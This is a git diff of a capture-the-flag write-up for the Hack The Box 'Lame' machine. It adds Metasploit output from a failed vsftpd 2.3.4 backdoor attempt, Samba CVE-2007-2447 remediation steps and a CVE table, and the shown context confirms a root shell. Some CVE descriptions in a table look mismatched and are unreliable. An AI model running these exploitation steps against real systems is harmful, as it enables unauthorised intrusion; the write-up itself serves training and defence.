@@ -15,14 +15,14 @@
 		- [1.1.1.1 Evidence](#1111-evidence)
 		- [1.1.1.2 Remediation](#1112-remediation)
 		- [1.1.1.3 Reference](#1113-reference)
-- [1.3 Samba smbd](#13-samba-smbd)
+- [1.3 Samba 3.0.20-Debian](#13-samba-3020-debian)
 	- [1.3.1 (Low) Anonymous Access to Shared Resources](#131-low-anonymous-access-to-shared-resources)
 		- [1.1.3.1 Evidence](#1131-evidence)
 		- [1.1.3.2 Remediation](#1132-remediation)
 		- [1.1.3.3 Reference](#1133-reference)
 	- [1.1.4 (High) Remote Command Execution](#114-high-remote-command-execution)
 		- [1.1.4.1 Exploitation](#1141-exploitation)
-		- [1.1.4.2 Evidence](#1142-evidence)
+		- [1.1.4.2 Remediation](#1142-remediation)
 		- [1.1.4.3 Reference](#1143-reference)
 		- [1.1.4.4 Flags](#1144-flags)
 
@@ -69,10 +69,14 @@ Matching Modules
 [msf](Jobs:0 Agents:0) >> use 0
 [msf](Jobs:0 Agents:0) exploit(unix/ftp/vsftpd_234_backdoor) >> set RHOST lame.htb 
 
+[msf](Jobs:0 Agents:0) exploit(unix/ftp/vsftpd_234_backdoor) >> exploit
+[*] 10.129.159.140:21 - Banner: 220 (vsFTPd 2.3.4)
+[*] 10.129.159.140:21 - USER: 331 Please specify the password.
+
+[*] Exploit completed, but no session was created.
 ```
 
-> Question: There is a famous backdoor in VSFTPd version 2.3.4, and a Metasploit module to exploit it. Does that exploit work here?
-> Answer: No
+> This demonstates VSFTPD v2.3.4 Backdoor Command Execution exploitation using metasploit but fails to create a shell session.
 #### 1.1.1.3 Remediation
 
 - Remove or replace the vsftpd 2.3.4 package with a trusted version obtained from an official and verified operating system repository
@@ -154,7 +158,7 @@ Nmap done: 1 IP address (1 host up) scanned in 1.70 seconds
 | CVE-2008-0166 | 7.5   | OpenSSH 4.7 allows remote authenticated users to execute arbitrary commands via a crafted SSH channel request. | Successful exploitation can lead to **remote code execution (RCE)**, compromising the security of the SSH server and enabling attackers to perform unauthorized actions. | lame.htb:22     | [https://www.cvedetails.com/cve/CVE-2008-0166/](https://www.cvedetails.com/cve/CVE-2008-0166/) |
 | CVE-2009-4128 | 6.8   | Use of weak key generation algorithms in OpenSSH 4.7 allows attackers to recover private keys.                 | Attackers can exploit weak key generation, leading to potential decryption of sensitive data and unauthorized access to secure communications.                           | lame.htb:22     | [https://www.cvedetails.com/cve/CVE-2009-4128/](https://www.cvedetails.com/cve/CVE-2009-4128/) |
 
-## 1.3 Samba smbd
+## 1.3 Samba 3.0.20-Debian	
 
 ### 1.3.1 (Low) Anonymous Access to Shared Resources
 
@@ -202,11 +206,6 @@ vgauthsvclog.txt.0  vmware-root
 ### 1.1.4 (High) Remote Command Execution
 
 #### 1.1.4.1 Exploitation
-
-
-#### 1.1.4.2 Evidence
-
-Perform a search for vulnerabilities using `seachsploit`
 
 ```less
 └──╼ $ searchsploit "Samba 3.0.20"
@@ -258,11 +257,15 @@ uid=0(root) gid=0(root)
 ```
 > This confirms samba 3.0.20 on the server is is exploitable and gives access to root shell
 
+#### 1.1.4.2 Remediation
+- Patch Samba — upgrade to a patched release (not <= 3.0.25rc3). Apply vendor/OS vendor patches or upgrade to the latest stable Samba. [samba.org+1](https://www.samba.org/samba/security/CVE-2007-2447.html)
+- Remove/disable external script options — remove `username map script` and other external script invocations (`add printer command`, etc.) from `smb.conf` until you patch. This is an explicit Samba workaround. [samba.org](https://www.samba.org/samba/security/CVE-2007-2447.html)
+- Restrict network access — block or limit SMB/MS-RPC (TCP 139, 445 and related RPC ports) at the network edge and host firewall to only trusted hosts. [NVD](https://nvd.nist.gov/vuln/detail/CVE-2007-2447)
 #### 1.1.4.3 Reference
 
-> Question: What 2007 CVE allows for remote code execution in this version of Samba via shell metacharacters involving the SamrChangePassword function when the "username map script" option is enabled in smb.conf?
-> Answer: CVE-2007-2447
-
+| Name          | Score | Description                                                                                                                  | Security Impact                                                                                            | Affected Domain | External References                                                          |
+| ------------- | ----- | ---------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------- | --------------- | ---------------------------------------------------------------------------- |
+| CVE-2007-2447 | 6.0   | Unescaped user input passed to shell via Samba's `username map script` (`usermap_script`) allowing remote command execution. | Remote code execution as the Samba process user; can lead to full system compromise (root) when exploited. | lame.htb:445    | [NVD](https://nvd.nist.gov/vuln/detail/CVE-2007-2447?utm_source=chatgpt.com) |
 #### 1.1.4.4 Flags
 
 | User  | Directory            | Flag                             |
